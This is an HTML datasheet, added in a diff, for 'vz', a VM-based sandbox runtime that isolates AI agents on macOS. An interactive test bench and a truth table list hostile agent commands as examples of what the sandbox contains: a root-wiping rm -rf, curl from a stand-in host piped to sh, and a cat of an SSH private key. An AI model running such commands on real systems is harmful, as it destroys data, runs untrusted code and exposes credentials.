+          <tr><td>Host bytes visible to the sandbox</td><td>–</td><td class="t-mono">declared mounts only</td><td class="t-mono">~/.ssh, keychain, secrets excluded</td><td class="t-dim">via VirtioFS, read-write as declared</td></tr>
+          <tr><td>Concurrent macOS guest VMs</td><td>1</td><td class="t-mono">–</td><td class="t-mono">2</td><td class="t-dim">kernel-enforced; Linux guest VMs not so limited</td></tr>
+          <tr><td>Guest memory / CPUs per sandbox</td><td class="t-mono">–</td><td class="t-mono">8 / 4</td><td class="t-mono">host RAM − reserve</td><td class="t-dim">GiB / cores, per vz.json resources</td></tr>
+          <tr><td>Checkpoint restore (fs_quick)</td><td>–</td><td class="t-mono">seconds</td><td>–</td><td class="t-dim">workspace-scoped snapshot class</td></tr>
+          <tr><td>Host effect of any agent action</td><td>–</td><td class="t-mono">NONE</td><td class="t-mono">NONE</td><td class="t-dim">see Truth Table, §7</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <p class="note">Note: "declared mounts only" is the honest version of isolation. The project directory you mount round-trips read-write. That is the design, visible and inspectable. Nothing undeclared crosses.</p>
+  </section>
+
+  <hr class="rule">
+
+  <!-- ─────────────── 4 · pin configuration: MCP interface ─────────────── -->
+  <section class="sec" aria-labelledby="pin-h">
+    <div class="sec-h">
+      <h2 id="pin-h"><span class="no">4</span>Pin configuration: agent interface</h2>
+      <span class="seclabel">Figure 2 · MCP register map<sup class="fn">4</sup></span>
+    </div>
+    <p>vz is agent-native, not agent-compatible. The future-state register map presents ten tools to any MCP client; each pin's status reflects the underlying primitive, because the MCP server itself is <span class="tag tag-planned">PLANNED</span>.</p>
+    <div class="figure">
+      <div class="figwrap">
+        <svg viewBox="0 0 1180 470" role="img" aria-label="IC package diagram: a chip labeled vz with ten pins. Left pins 1-5: sandbox create, exec, read file, write file, list dir. Right pins 6-10: checkpoint, restore, set network, preview URL, destroy sandbox. Each pin marked active, dev, or planned.">
+          <!-- left pin wires -->
+          <g font-family="IBM Plex Mono" font-size="12.5" fill="#1f1c18">
+            <line x1="300" y1="90"  x2="470" y2="90"  stroke="#1f1c18" stroke-width="1.3"/><rect x="470" y="86" width="10" height="8" fill="#1f1c18"/>
+            <text x="292" y="94"  text-anchor="end">1 · vz_create_sandbox</text>
+            <line x1="300" y1="150" x2="470" y2="150" stroke="#1f1c18" stroke-width="1.3"/><rect x="470" y="146" width="10" height="8" fill="#1f1c18"/>
+            <text x="292" y="154" text-anchor="end">2 · vz_exec</text>
+            <line x1="300" y1="210" x2="470" y2="210" stroke="#1f1c18" stroke-width="1.3"/><rect x="470" y="206" width="10" height="8" fill="#1f1c18"/>
+            <text x="292" y="214" text-anchor="end">3 · vz_read_file</text>
+            <line x1="300" y1="270" x2="470" y2="270" stroke="#1f1c18" stroke-width="1.3"/><rect x="470" y="266" width="10" height="8" fill="#1f1c18"/>
+            <text x="292" y="274" text-anchor="end">4 · vz_write_file</text>
+            <line x1="300" y1="330" x2="470" y2="330" stroke="#1f1c18" stroke-width="1.3"/><rect x="470" y="326" width="10" height="8" fill="#1f1c18"/>
+            <text x="292" y="334" text-anchor="end">5 · vz_list_dir</text>
+
+            <line x1="710" y1="90"  x2="880" y2="90"  stroke="#1f1c18" stroke-width="1.3"/><rect x="700" y="86" width="10" height="8" fill="#1f1c18"/>
+            <text x="898" y="94">6 · vz_checkpoint</text>
+            <line x1="710" y1="150" x2="880" y2="150" stroke="#1f1c18" stroke-width="1.3"/><rect x="700" y="146" width="10" height="8" fill="#1f1c18"/>
+            <text x="898" y="154">7 · vz_restore</text>
+            <line x1="710" y1="210" x2="880" y2="210" stroke="#1f1c18" stroke-width="1.3"/><rect x="700" y="206" width="10" height="8" fill="#1f1c18"/>
+            <text x="898" y="214">8 · vz_set_network</text>
+            <line x1="710" y1="270" x2="880" y2="270" stroke="#1f1c18" stroke-width="1.3"/><rect x="700" y="266" width="10" height="8" fill="#1f1c18"/>
+            <text x="898" y="274">9 · vz_preview_url</text>
+            <line x1="710" y1="330" x2="880" y2="330" stroke="#1f1c18" stroke-width="1.3"/><rect x="700" y="326" width="10" height="8" fill="#1f1c18"/>
+            <text x="898" y="334">10 · vz_destroy_sandbox</text>
+          </g>
+
+          <!-- pin status dots -->
+          <g>
+            <rect x="292" y="102" width="7" height="7" fill="#0f4c81"/><rect x="283" y="102" width="7" height="7" fill="#7a6015"/><rect x="274" y="102" width="7" height="7" fill="#7a6015"/>
+            <rect x="292" y="162" width="7" height="7" fill="#0f4c81"/>
+            <rect x="292" y="222" width="7" height="7" fill="#7a6015"/>
+            <rect x="292" y="282" width="7" height="7" fill="#7a6015"/>
+            <rect x="292" y="342" width="7" height="7" fill="#7a6015"/>
+            <rect x="283" y="102" width="7" height="7" fill="#7a6015"/>
+          </g>
+
+          <!-- chip body -->
+          <rect x="480" y="60" width="220" height="310" fill="#f7f4ec" stroke="#1f1c18" stroke-width="2"/>
+          <circle cx="508" cy="88" r="7" fill="none" stroke="#1f1c18" stroke-width="1.4"/>
+          <text x="590" y="215" text-anchor="middle" font-family="Archivo" font-weight="800" font-size="84" fill="#1f1c18" letter-spacing="-2">vz</text>
+          <text x="590" y="252" text-anchor="middle" font-family="IBM Plex Mono" font-size="12" letter-spacing="2.2" fill="#5a5347">SANDBOX RUNTIME</text>
+          <text x="590" y="272" text-anchor="middle" font-family="IBM Plex Mono" font-size="10.5" letter-spacing="1.4" fill="#5a5347">VZ-FS-2026-001 · REV F</text>
+          <text x="590" y="346" text-anchor="middle" font-family="IBM Plex Mono" font-size="10.5" letter-spacing="1.4" fill="#a33327">MCP SERVER · PLANNED</text>
+
+          <!-- status legend -->
+          <g font-family="IBM Plex Mono" font-size="11.5">
+            <rect x="480" y="396" width="7" height="7" fill="#0f4c81"/><text x="494" y="404" fill="#1f1c18">primitive ACTIVE</text>
+            <rect x="640" y="396" width="7" height="7" fill="#7a6015"/><text x="654" y="404" fill="#1f1c18">primitive DEV</text>
+            <rect x="790" y="396" width="7" height="7" fill="#a33327"/><text x="804" y="404" fill="#1f1c18">primitive PLANNED</text>
+          </g>
+        </svg>
+      </div>
+      <p class="figcap"><b>Figure 2.</b> Agent interface, package view. Same surfaces exposed over the gRPC runtime API and local HTTP API for orchestrators.</p>
+    </div>
+
+    <div class="tbl-wrap">
+      <table class="tbl" aria-label="Pin function table">
+        <thead>
+          <tr><th>Pin</th><th>Tool</th><th>Function</th><th>Primitive</th><th>Status</th></tr>
+        </thead>
+        <tbody>
+          <tr><td class="t-num">1</td><td class="t-mono">vz_create_sandbox</td><td>Provision VM + mount + optional main container from an image ref or vz.json</td><td class="t-dim">daemon lifecycle</td><td><span class="tag tag-dev">DEV</span></td></tr>
+          <tr><td class="t-num">2</td><td class="t-mono">vz_exec</td><td>Run a command; stream stdout/stderr/stdin; PTY; signal; timeout</td><td class="t-dim">youki + guest agent</td><td><span class="tag tag-active">ACTIVE</span> <span class="tag tag-dev">DEV</span> stream API</td></tr>
+          <tr><td class="t-num">3</td><td class="t-mono">vz_read_file</td><td>Read guest file bytes or text</td><td class="t-dim">files API</td><td><span class="tag tag-dev">DEV</span></td></tr>
+          <tr><td class="t-num">4</td><td class="t-mono">vz_write_file</td><td>Write guest file (atomic)</td><td class="t-dim">files API</td><td><span class="tag tag-dev">DEV</span></td></tr>
+          <tr><td class="t-num">5</td><td class="t-mono">vz_list_dir</td><td>List guest directory entries + metadata</td><td class="t-dim">files API</td><td><span class="tag tag-dev">DEV</span></td></tr>
+          <tr><td class="t-num">6</td><td class="t-mono">vz_checkpoint</td><td>Snapshot workspace state (fs_quick), tagged, retained by policy</td><td class="t-dim">checkpoint engine</td><td><span class="tag tag-active">ACTIVE</span></td></tr>
+          <tr><td class="t-num">7</td><td class="t-mono">vz_restore</td><td>Restore sandbox to checkpoint; fork from checkpoint</td><td class="t-dim">checkpoint engine</td><td><span class="tag tag-active">ACTIVE</span></td></tr>
+          <tr><td class="t-num">8</td><td class="t-mono">vz_set_network</td><td>Block-all egress + domain/IP allowlist for the sandbox</td><td class="t-dim">egress policy</td><td><span class="tag tag-planned">PLANNED</span></td></tr>
+          <tr><td class="t-num">9</td><td class="t-mono">vz_preview_url</td><td>Publish a guest port to the host as a reachable URL</td><td class="t-dim">port forward</td><td><span class="tag tag-planned">PLANNED</span></td></tr>
+          <tr><td class="t-num">10</td><td class="t-mono">vz_destroy_sandbox</td><td>Tear down VM + state; everything dies with it</td><td class="t-dim">daemon lifecycle</td><td><span class="tag tag-active">ACTIVE</span></td></tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <hr class="rule">
+
+  <!-- ─────────────── 5-6 · detailed description ─────────────── -->
+  <section class="sec" aria-labelledby="detail-h">
+    <div class="sec-h">
+      <h2 id="detail-h"><span class="no">5</span>Detailed description</h2>
+      <span class="seclabel">Clauses 5.1 – 5.6</span>
+    </div>
+    <div class="clauses">
+
+      <article class="clause">
+        <div class="clause-h"><span class="cno">5.1</span>Host / guest boundary</div>
+        <div class="clause-b">
+          <p>The host runs a CLI, a control daemon, and thin vsock/VirtioFS plumbing. The guest runs everything else. This is not a Docker Desktop arrangement in disguise: there is no hidden VM doing unaccountable work; the VM is the product, inspectable down to its kernel config.<sup class="fn">3</sup></p>
+          <div class="statusline">Status: <span class="tag tag-active">ACTIVE</span> architectural invariant since v0.1</div>
+        </div>
+      </article>
+
+      <article class="clause">
+        <div class="clause-h"><span class="cno">5.2</span>Container runtime &amp; stacks</div>
+        <div class="clause-b">
+          <p>OCI images pull, run, exec, and log through <b>youki</b> executing inside the guest; the host never unpacks a layer. Compose-class stacks reconcile deterministically through vz-stack: same apply, same result, restart-safe.</p>
+          <pre class="cmdline"><span class="cmt"># bring a whole environment up, stream its logs, tear it down</span>
+vz stack up -f compose.yaml -n demo
+vz stack logs demo --service web --follow
+vz stack down demo --volumes</pre>
+          <div class="statusline">Status: <span class="tag tag-active">ACTIVE</span> youki in-guest · <span class="tag tag-active">ACTIVE</span> deterministic stacks · <span class="tag tag-dev">DEV</span> stack egress (netns MASQUERADE)</div>
+        </div>
+      </article>
+
+      <article class="clause">
+        <div class="clause-h"><span class="cno">5.3</span>Docker compatibility: the daemon lives in the guest</div>
+        <div class="clause-b">
+          <p>Revision F's headline: run the <em>real</em> Docker inside the guest. dockerd + containerd execute in the VM on the guest kernel (MEMCG and BRIDGE_NETFILTER enabled); the host gets a unix-socket proxy over vsock. Your existing <code>docker</code> CLI, Compose, and buildx work verbatim, pointed at a daemon your Mac never ran.<sup class="fn">3</sup></p>
+          <pre class="cmdline"><span class="cmt"># nothing changes except where the daemon lives</span>
+export DOCKER_HOST=unix://$HOME/.vz/docker.sock
+docker compose up
+docker build -t app .</pre>
+          <div class="statusline">Status: <span class="tag tag-active">ACTIVE</span> vz docker shim (run/exec/ps/logs/pull/build, strict guardrails) · <span class="tag tag-planned">PLANNED</span> full dockerd-in-guest + socket proxy</div>
+        </div>
+      </article>
+
+      <article class="clause">
+        <div class="clause-h"><span class="cno">5.4</span>Agent integration &amp; trust</div>
+        <div class="clause-b">
+          <p>Beyond the MCP register of §4, every mutating operation emits a signed receipt; an orchestrator can reconstruct exactly what an agent did, when, and to which sandbox. Leases and events are first-class in the gRPC contract.</p>
+          <div class="statusline">Status: <span class="tag tag-active">ACTIVE</span> receipts + leases in runtime contract · <span class="tag tag-dev">DEV</span> inspection surface · <span class="tag tag-planned">PLANNED</span> MCP server</div>
+        </div>
+      </article>
+
+      <article class="clause">
+        <div class="clause-h"><span class="cno">5.5</span>Checkpoints &amp; disposability</div>
+        <div class="clause-b">
+          <p>fs_quick snapshots capture workspace state in seconds; restore forks a sandbox from any checkpoint. The unit of agent experimentation becomes cheap: try the dangerous thing, restore, try again. macOS guests additionally support full save/restore VM state.</p>
+          <div class="statusline">Status: <span class="tag tag-active">ACTIVE</span> fs_quick (daemon) · <span class="tag tag-active">ACTIVE</span> macOS VM save/restore · <span class="tag tag-planned">PLANNED</span> template-from-checkpoint</div>
+        </div>
+      </article>
+
+      <article class="clause">
+        <div class="clause-h"><span class="cno">5.6</span>Platform expansion</div>
+        <div class="clause-b">
+          <p>Same CLI, same runtime contract, Linux hosts later: sandboxes become containers on a native kernel, no workflow rewrite. Local-first first, cloud-expandable when you need it.</p>
+          <div class="statusline">Status: <span class="tag tag-dev">DEV</span> linux-native backend (partial) · <span class="tag tag-planned">PLANNED</span> hosted Linux target</div>
+        </div>
+      </article>
+
+    </div>
+  </section>
+
+  <hr class="rule">
+
+  <!-- ─────────────── 6 · EVM-1: boundary test bench ─────────────── -->
+  <section class="sec" aria-labelledby="bench-h">
+    <div class="sec-h">
+      <h2 id="bench-h"><span class="no">6</span>Boundary test bench</h2>
+      <span class="seclabel">EVM-1 · interactive</span>
+    </div>
+    <p>These are the commands that keep you up at night when an agent has a shell. Select one, run it, and read the two channels the way a scope reads them: what the guest did, and what the host did.</p>
+    <div class="bench" role="group" aria-label="Boundary test bench">
+      <div class="bench-h">
+        <span><span class="evm">EVM-1</span> · BOUNDARY TEST BENCH · ILLUSTRATIVE</span>
+        <span>CH1 GUEST · CH2 HOST</span>
+      </div>
+      <div class="bench-body">
+        <div class="bench-controls">
+          <div class="lbl" id="preset-lbl">Agent stimulus</div>
+          <div role="group" aria-labelledby="preset-lbl">
+            <button type="button" class="preset" aria-pressed="true"  data-case="rmrf">  <span class="pid">A1</span>  rm -rf --no-preserve-root /</button>
+            <button type="button" class="preset" aria-pressed="false" data-case="pipe"><span class="pid">A2</span>  curl http://sketchy.example | sh</button>
+            <button type="button" class="preset" aria-pressed="false" data-case="keys"> <span class="pid">A3</span>  cat ~/.ssh/id_ed25519</button>
+            <button type="button" class="preset" aria-pressed="false" data-case="pkg">  <span class="pid">A4</span>  apt-get install -y whole-toolchain</button>
+            <button type="button" class="preset" aria-pressed="false" data-case="dind"> <span class="pid">A5</span>  docker compose up --build</button>
+          </div>
+          <button type="button" class="run-btn" id="run-btn">Run stimulus</button>
+        </div>
+        <div class="bench-read">
+          <div class="cell">
+            <div class="cell-h"><span>Guest console</span><span class="chan">CH1</span></div>
+            <div class="console-out" id="console-out" aria-live="polite"><span class="ps1">agent@vz-sandbox:~$</span> <span class="ps1">_</span></div>
+          </div>
+          <div class="cell">
+            <div class="cell-h"><span>Guest effect</span><span class="chan">CH1</span></div>
+            <div class="guest-out" id="guest-out" aria-live="polite">Awaiting stimulus.</div>
+          </div>
+          <div class="cell" style="border-bottom: 0;">
+            <div class="cell-h"><span>Host effect</span><span class="chan">CH2</span></div>
+            <div class="host-out" id="host-out" aria-live="polite">
+              <span class="host-verdict">NONE</span>
+              <div class="host-meter">host processes touched&nbsp; <b>0</b><br>host files touched&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>0</b><br>host sockets opened&nbsp;&nbsp;&nbsp; <b>0</b></div>
+            </div>
+          </div>
+          <div class="cell" style="border-bottom: 0;">
+            <div class="cell-h"><span>Recovery</span><span class="chan">CH1</span></div>
+            <div class="guest-out" id="recovery-out">The sandbox is disposable by design.</div>
+          </div>
+          <div class="recovery" id="bench-note">Mechanism note: the guest kernel mediates every effect. Declared VirtioFS mounts are the only shared bytes; <code>~/.ssh</code> is not among them. Egress policy (<span class="tag tag-planned">PLANNED</span>, §5.4) will bound the network channel the same way the VM bounds the filesystem.</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <hr class="rule">
+
+  <!-- ─────────────── 7 · truth table ─────────────── -->
+  <section class="sec truth" aria-labelledby="truth-h">
+    <div class="sec-h">
+      <h2 id="truth-h"><span class="no">7</span>Truth table</h2>
+      <span class="seclabel">The specification, compressed</span>
+    </div>
+    <p>One table to print and tape above your desk. Whatever the agent does, column three does not change, except through the one honest, declared channel.</p>
+    <div class="tbl-wrap">
+      <table class="tbl" aria-label="Truth table of agent inputs, guest effects, and host effects">
+        <thead>
+          <tr><th>Agent input</th><th>Guest effect (CH1)</th><th>Host effect (CH2)</th></tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td class="t-mono">rm -rf /</td>
+            <td>Guest filesystem destroyed<span class="fx">sandbox dies inside the VM; kernel, host, and mounts unaffected</span></td>
+            <td class="host-none">NONE</td>
+          </tr>
+          <tr>
+            <td class="t-mono">curl … | sh</td>
+            <td>Arbitrary code as guest process, NAT egress<span class="fx">damage confined to disposable VM; egress policy PLANNED §5.4</span></td>
+            <td class="host-none">NONE</td>
+          </tr>
+          <tr>
+            <td class="t-mono">cat ~/.ssh/id_ed25519</td>
+            <td><span class="t-mono">no such file</span><span class="fx">only declared VirtioFS mounts exist in the guest</span></td>
+            <td class="host-none">NONE</td>
+          </tr>
+          <tr>
+            <td class="t-mono">apt-get install …</td>
+            <td>Guest packages, cached per setup-hash<span class="fx">persist across restarts; destroyed with the sandbox</span></td>
+            <td class="host-none">NONE</td>
+          </tr>
+          <tr>
+            <td class="t-mono">docker compose up</td>
+            <td>Full Docker in the guest<span class="fx">daemon, containers, volumes: all inside the VM, PLANNED §5.3</span></td>
+            <td class="host-none">NONE</td>
+          </tr>
+          <tr>
+            <td class="t-mono">write ./project/**</td>
+            <td>Project mount round-trips<span class="fx">the declared workspace is read-write by design</span></td>
+            <td class="host-mount">DECLARED MOUNT ONLY</td>
+          </tr>
+        </tbody>
+        <tfoot>
+          <tr><td colspan="3">NONE ≡ no host process, file, socket, or credential is created, read, or written outside mounts declared in the sandbox spec. Recovery from any row: <code class="t-mono">vz checkpoint</code> / <code class="t-mono">vz restore</code>, or destroy the sandbox; the host was never involved.</td></tr>
+        </tfoot>
+      </table>
+    </div>
+  </section>
+
+  <hr class="rule">
+
+  <!-- ─────────────── 8 · ordering information ─────────────── -->
+  <section class="sec" aria-labelledby="order-h">
+    <div class="sec-h">
+      <h2 id="order-h"><span class="no">8</span>Ordering information</h2>
+      <span class="seclabel">All SKUs run on your hardware</span>
+    </div>
+    <div class="tbl-wrap">
+      <table class="tbl" aria-label="Ordering information">
+        <thead>
+          <tr><th>Package</th><th>Contents</th><th>Order code</th><th>Status</th></tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td class="t-mono">vz-prebuilt</td>
+            <td>Signed + notarized CLI, guest kernel (both profiles), guest agent</td>
+            <td class="t-mono">curl -sSf https://raw.githubusercontent.com/gpu-cli/vz/main/scripts/install.sh | sh</td>
+            <td><span class="tag tag-active">ACTIVE</span></td>
+          </tr>
+          <tr>
+            <td class="t-mono">vz-source</td>
+            <td>Crate build; apply Virtualization.framework entitlements</td>
+            <td class="t-mono">cargo install --git https://github.com/gpu-cli/vz.git vz-cli<br>&amp;&amp; vz self-sign</td>
+            <td><span class="tag tag-active">ACTIVE</span></td>
+          </tr>
+          <tr>
+            <td class="t-mono">kernel-developer</td>
+            <td>Broad dev kernel: nested virt, TUN/TAP for Firecracker hosts</td>
+            <td class="t-mono">make -C linux docker-build</td>
+            <td><span class="tag tag-active">ACTIVE</span></td>
+          </tr>
+          <tr>
+            <td class="t-mono">kernel-container</td>
+            <td>Constrained sandbox kernel: seccomp, netns, btrfs snapshots, NFS server</td>
+            <td class="t-mono">make -C linux docker-build KERNEL_PROFILE=container</td>
+            <td><span class="tag tag-active">ACTIVE</span></td>
+          </tr>
+          <tr>
+            <td class="t-mono">vz-agent-skill</td>
+            <td>Claude plugin + skill: agents pick vz up with zero config</td>
+            <td class="t-mono">.claude-plugin/ (in repo)</td>
+            <td><span class="tag tag-active">ACTIVE</span></td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+    <p class="order-note"><b>First command after install:</b> <code>cd your-project &amp;&amp; vz init &amp;&amp; vz run echo "hello from Linux"</code>. vz.json is generated per project (Rust / Node / Python / Go auto-detected), and the first run boots the VM, pulls the base image, and caches setup by hash.<sup class="fn">2</sup></p>
+  </section>
+
+  <hr class="rule">
+
+  <!-- ─────────────── 9 · revision history ─────────────── -->
+  <section class="sec" aria-labelledby="rev-h">
+    <div class="sec-h">
+      <h2 id="rev-h"><span class="no">9</span>Revision history</h2>
+      <span class="seclabel">Honest by construction</span>
+    </div>
+    <div class="tbl-wrap">
+      <table class="tbl" aria-label="Revision history">
+        <thead>
+          <tr><th>Rev</th><th>When</th><th>Status</th><th>Changes</th></tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td class="t-mono">0.3.20</td><td class="t-dim">shipped</td><td><span class="tag tag-active">ACTIVE</span></td>
+            <td>youki OCI runtime in-guest · deterministic Compose stacks · BuildKit builds in guest VM · fs_quick checkpoints · macOS VM flows + signed patch bundles + delta patches · gRPC daemon + HTTP API · vz.json / vz run</td>
+          </tr>
+          <tr>
+            <td class="t-mono">F.1</td><td class="t-dim">in dev</td><td><span class="tag tag-dev">DEV</span></td>
+            <td>Runtime data plane: streaming exec + stdin/PTY, filesystem API, sandbox lifecycle through API/CLI, stack egress (netns MASQUERADE), Docker shim hardening</td>
+          </tr>
+          <tr>
+            <td class="t-mono">F.2</td><td class="t-dim">planned</td><td><span class="tag tag-planned">PLANNED</span></td>
+            <td>Docker in the guest: MEMCG + BRIDGE_NETFILTER kernel, dockerd/containerd provisioned in guest, unix-socket proxy over vsock, full docker CLI/Compose/buildx compat</td>
+          </tr>
+          <tr>
+            <td class="t-mono">F.3</td><td class="t-dim">planned</td><td><span class="tag tag-planned">PLANNED</span></td>
+            <td>MCP server (register map §4) · egress policy + receipts surface · preview URLs (port forward) · template-from-checkpoint · Linux hosts</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+    <p class="note">Features marked PLANNED describe the committed roadmap this document specifies, not shipped capability. Production behavior is defined by the ACTIVE rows and the repository, gpu-cli/vz on GitHub.</p>
+  </section>
+
+  <!-- ─────────────── notes ─────────────── -->
+  <section class="notes" aria-label="Notes">
+    <h3>Notes</h3>
+    <ol>
+      <li>Full Linux VM per sandbox on Apple Virtualization.framework; macOS 14+ (Sonoma) required for VM state save/restore.</li>
+      <li>Boot and reuse behavior as stated in the vz repository documentation (v0.3.20): ~3 s typical cold boot to first command; setup cached by hash; warm reuse instant. Subject to the project's measured-claims policy; no independent benchmark is claimed here.</li>
+      <li>Architectural invariant: the host executes only the CLI, the vz-runtimed control daemon, and vsock/VirtioFS plumbing; every workload, including dockerd in revision F.2, executes inside the guest VM.</li>
+      <li>Agent interface register follows the vz agent-sandbox API landscape survey (MCP tool set, §7.5); MCP server implementation is PLANNED (rev F.3). Underlying primitives carry their own statuses.</li>
+      <li>Guest kernel 6.12.85, profiles <code>developer</code> (nested virt) and <code>container</code> (constrained: seccomp, netns, overlayfs, btrfs snapshots).</li>
+    </ol>
+  </section>
+
+  <footer class="colophon">
+    <span>gpu-cli / vz · VZ-FS-2026-001 · REV F</span>
+    <span><a href="https://github.com/gpu-cli/vz" rel="noopener">github.com/gpu-cli/vz</a> · MIT</span>
+    <span>subject to change without notice</span>
+  </footer>
+
+</main>
+
+<script>
+(function () {
+  "use strict";
+  var reduced = window.matchMedia("(prefers-reduced-motion: reduce)").matches;
+  var presets = Array.prototype.slice.call(document.querySelectorAll(".preset"));
+  var runBtn = document.getElementById("run-btn");
+  var consoleOut = document.getElementById("console-out");
+  var guestOut = document.getElementById("guest-out");
+  var hostOut = document.getElementById("host-out");
+  var recoveryOut = document.getElementById("recovery-out");
+
+  var CASES = {
+    rmrf: {
+      cmd: "rm -rf --no-preserve-root /",
+      guest: { kind: "FILESYSTEM DESTROYED", body: "The recursive delete executes against the guest's own root. The VM's filesystem collapses; the guest agent loses the process. The VM boundary holds: outside it, the command is a string of bytes." },
+      recovery: "vz restore <checkpoint>: the workspace returns in seconds, or destroy the sandbox and boot a fresh one (~3 s)."
+    },
+    pipe: {
+      cmd: "curl http://sketchy.example | sh",
+      guest: { kind: "ARBITRARY PROCESS + NAT EGRESS", body: "The script runs as a guest process with NAT egress, exactly as dangerous as it looks, and confined to a disposable machine. Egress policy (rev F.3) will bound the network channel the way the VM bounds the filesystem." },
+      recovery: "vz destroy sandbox: the process, its files, and its network state cease to exist with the VM."
+    },
+    keys: {
+      cmd: "cat ~/.ssh/id_ed25519",
+      guest: { kind: "NO SUCH FILE", body: "The guest sees only the mounts declared in the sandbox spec, typically /workspace. Your home directory, keychain, and secrets were never in the VM, so there is nothing to read." },
+      recovery: "Nothing to recover from, but run vz checkpoint anyway; agents that go looking for keys get the sandbox destroyed."
+    },
+    pkg: {
+      cmd: "apt-get install -y whole-toolchain",
+      guest: { kind: "GUEST PACKAGES INSTALLED", body: "Gigabytes land in the guest's persistent volume. Setup commands are cached by hash, so the toolchain survives restarts and vanishes the day you destroy the sandbox." },
+      recovery: "Nothing needed: this is the normal path. Add it to vz.json setup[] and it becomes part of the sandbox spec."
+    },
+    dind: {
+      cmd: "docker compose up --build",
+      guest: { kind: "FULL DOCKER, IN THE GUEST", body: "Daemon, containers, volumes, and BuildKit all execute inside the VM on the guest kernel (rev F.2). The host contributes a client and a socket that is a proxy, nothing more." },
+      recovery: "docker compose down -v, or vz stop: the daemon and everything it built dies with the sandbox."
+    }
+  };
+
+  var current = "rmrf";
+  presets.forEach(function (btn) {
+    btn.addEventListener("click", function () {
+      presets.forEach(function (b) { b.setAttribute("aria-pressed", String(b === btn)); });
+      current = btn.dataset.case;
+    });
+  });
+
+  function typeLine(el, text, done) {
+    var i = 0;
+    el.textContent = "";
+    (function step() {
+      el.textContent = text.slice(0, ++i);
+      if (i < text.length) { setTimeout(step, reduced ? 0 : 14); }
+      else { done(); }
+    })();
+  }
+
+  runBtn.addEventListener("click", function () {
+    var c = CASES[current];
+    runBtn.disabled = true;
+
+    consoleOut.innerHTML = '<span class="ps1">agent@vz-sandbox:~$</span> ';
+    var span = document.createElement("span");
+    consoleOut.appendChild(span);
+    guestOut.textContent = "Stimulus executing in guest…";
+    recoveryOut.textContent = "Awaiting result.";
+
+    var finish = function () {
+      guestOut.innerHTML = "";
+      var kind = document.createElement("span");
+      kind.className = "fx-kind";
+      kind.textContent = c.guest.kind;
+      guestOut.appendChild(kind);
+      guestOut.appendChild(document.createElement("br"));
+      guestOut.appendChild(document.createTextNode(c.guest.body));
+
+      hostOut.innerHTML =
+        '<span class="host-verdict">NONE</span>' +
+        '<div class="host-meter">host processes touched&nbsp; <b>0</b><br>host files touched&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>0</b><br>host sockets opened&nbsp;&nbsp;&nbsp; <b>0</b></div>';
+      hostOut.closest(".cell").classList.remove("flash");
+      void hostOut.offsetWidth; /* restart animation */
+      hostOut.closest(".cell").classList.add("flash");
+
+      recoveryOut.textContent = c.recovery;
+      runBtn.disabled = false;
+    };
+
+    if (reduced) {
+      span.textContent = c.cmd;
+      finish();
+    } else {
+      typeLine(span, c.cmd, function () {
+        setTimeout(finish, 320);
+      });
+    }
+  });
+})();
+</script>
+</body>
+</html>
